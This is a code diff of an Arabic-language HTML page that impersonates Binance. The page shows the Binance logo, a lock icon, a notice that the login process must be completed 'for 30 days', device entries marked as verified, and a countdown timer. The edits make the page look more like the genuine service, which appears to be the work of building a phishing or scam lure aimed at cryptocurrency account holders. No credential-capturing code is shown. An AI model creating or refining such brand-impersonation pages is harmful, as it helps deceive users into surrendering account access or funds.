@@ -52,12 +52,29 @@
       width: 90%;
       margin: 100px auto 0 auto; /* لضمان عدم تغطية المحتوى بالرأس */
     }
-    /* تنسيق أقسام الجهاز */
+    /* تنسيق أيقونة القفل والعناوين الأصلية */
+    .logo {
+      width: 96px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+    }
+    p.subtitle {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+    }
+    /* تنسيق أقسام الأجهزة */
     .device-section {
       display: flex;
       align-items: center;
       justify-content: flex-start;
-      margin-bottom: 30px;
+      margin: 20px 0;
+      padding: 10px;
+      border: 1px solid #333;
+      border-radius: 5px;
     }
     .device-icon {
       width: 64px;
@@ -76,8 +93,13 @@
     }
     .check-mark {
       font-size: 1.2rem;
-      color: #F0B90B; /* اللون الأصفر متناسق مع باينانس */
+      color: #28a745; /* أخضر */
       margin-left: 8px;
+    }
+    .verified {
+      font-size: 1rem;
+      color: #28a745;
+      margin-top: 5px;
     }
     .countdown {
       font-size: 1rem;
@@ -87,26 +109,33 @@
   </style>
 </head>
 <body>
-  <!-- رأس الصفحة -->
+  <!-- رأس الصفحة مع شعار باينانس -->
   <header>
-    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=023" alt="Binance Logo">
+    <!-- تم تعديل رابط شعار باينانس لإظهاره بشكل صحيح -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Binance_Logo.svg" alt="Binance Logo">
     <h2>BINANCE</h2>
   </header>
   
   <!-- المحتوى الرئيسي -->
   <div class="container">
+    <!-- أيقونة القفل الأصلية -->
+    <img class="logo" src="https://img.icons8.com/fluency/96/000000/lock.png" alt="Lock Logo">
+    <h1>يجب اتمام عمليه تسجيل الدخول</h1>
+    <p class="subtitle">لمدة 30 يوما</p>
+    
     <!-- قسم جهاز الكمبيوتر -->
     <div class="device-section">
-      <!-- أيقونة الجهاز: يمكن تعديل الرابط حسب الرغبة -->
+      <!-- أيقونة الجهاز: تم استخدام أيقونة شاشة -->
       <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/monitor.png" alt="Computer Icon">
       <div class="device-info">
         <h2>Windows 7 <span class="check-mark">&#10004;</span></h2>
-        <!-- يمكن إضافة معلومات إضافية هنا إذا دعت الحاجة -->
+        <div class="verified">تم التأكد منه</div>
       </div>
     </div>
+    
     <!-- قسم الهاتف المحمول -->
     <div class="device-section">
-      <!-- أيقونة الهاتف المحمول: يمكن تعديل الرابط حسب الرغبة -->
+      <!-- أيقونة الهاتف المحمول -->
       <img class="device-icon" src="https://img.icons8.com/fluency/96/000000/smartphone.png" alt="Phone Icon">
       <div class="device-info">
         <h2>Galaxy S8+</h2>
@@ -133,7 +162,7 @@
       const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
       const seconds = Math.floor((distance % (1000 * 60)) / 1000);
   
-      // عرض النتيجة بشكل واقعي
+      // عرض العد التنازلي بشكل واقعي
       countdownElement.innerHTML = days + " يوم " + hours + " ساعة " + minutes + " دقيقة " + seconds + " ثانية";
   
       // عند انتهاء الوقت، عرض رسالة بديلة
